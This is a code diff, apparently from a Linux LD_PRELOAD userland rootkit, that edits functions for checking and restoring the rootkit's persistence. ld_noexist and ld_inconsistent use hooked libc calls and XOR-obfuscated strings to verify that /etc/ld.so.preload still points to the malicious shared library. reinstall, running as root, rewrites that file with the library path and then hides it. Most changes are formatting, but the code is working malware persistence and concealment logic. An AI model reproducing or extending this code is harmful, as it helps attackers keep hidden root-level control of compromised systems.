@@ -1,5 +1,4 @@
-int ld_noexist(void)
-{
+int ld_noexist(void){
     int noexist = 0;
     hook(CACCESS);
     xor(ldpreload, LDSO_PRELOAD);
@@ -9,30 +8,33 @@ int ld_noexist(void)
     return noexist;
 }
 
-int ld_inconsistent(void)
-{
+int ld_inconsistent(void){
     struct stat ldstat;
     int inconsistent = 0;
+
     hook(C__XSTAT);
+    memset(&ldstat, 0, sizeof(stat));
     xor(ldpreload, LDSO_PRELOAD);
-    xor(sopath, SOPATH);
     (void)call(C__XSTAT, _STAT_VER, ldpreload, &ldstat);
-    if(ldstat.st_size != strlen(sopath) || ld_noexist()) inconsistent = 1;
     clean(ldpreload);
+
+    xor(sopath, SOPATH);
+    if(ldstat.st_size != strlen(sopath) || ld_noexist())
+        inconsistent = 1;    
     clean(sopath);
+
     return inconsistent;
 }
 
-void reinstall(void)
-{
+void reinstall(void){
     if(not_user(0) || !ld_inconsistent()) return;
 
     FILE *ldfp = xfopen(LDSO_PRELOAD, "w");
 
     if(ldfp != NULL){
         xfwrite(SOPATH, 1, ldfp);
-        (void)fflush(ldfp);
-        (void)fclose(ldfp);
+        fflush(ldfp);
+        fclose(ldfp);
 
         xhide_path(LDSO_PRELOAD);
     }
